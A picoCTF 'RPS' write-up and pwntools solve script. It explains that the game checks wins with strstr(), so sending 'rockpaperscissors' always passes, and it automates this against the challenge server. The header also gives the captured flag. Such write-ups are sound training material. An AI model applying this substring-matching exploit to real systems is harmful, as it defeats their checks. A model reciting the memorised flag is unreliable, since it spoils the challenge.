#!/usr/bin/env python3

################################# Write-Up ################################
# Challenge: RPS
# Category: Binary Exploitation
# Description: Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row. Connect to the program with netcat: $ nc saturn.picoctf.net 56981 The program's source code with the flag redacted can be downloaded here.
# Hints:
#	-1: How does the program check if you won?
#
# At first looking at the source code I saw that the computer responses
# were generated using srand() with the seed time(0) and rand(), so I
# thought the exploit would be a time-based attack, but that wasn't the
# case. Looking back at the hint, I looked a bit more at the source and
# saw that the comparison being made to check if I won was using the
# strstr() cmd, which I looked up finds if the second arg is found in the
# first arg, both args being strings. Every time I play, the program
# takes in my input as the first arg in strstr(), and the second arg is
# the computer's randomized response as rock, paper, or scissors (as a
# string). So, the vuln is this function, and to exploit it all I have to
# do is type in "rockpaperscissors" every time so that no matter what
# choice the computer makes, its respose will always be included in my
# response, passing the check. Do this five times, and you get the flag.
#
# Flag: picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}
# Points: 200
# SOlved by giggsterpuku 2 days into comp
###########################################################################

from pwn import *

def conn():
	return remote("saturn.picoctf.net", 56981)

def main():
	r = conn()
	for i in range(6):
		print(r.recvuntil("program"))
		r.sendline("1")
		print(r.recvuntil("(rock/paper/scissors):"))
		r.sendline("rockpaperscissors")
	r.interactive()


if __name__ == "__main__":
	main()
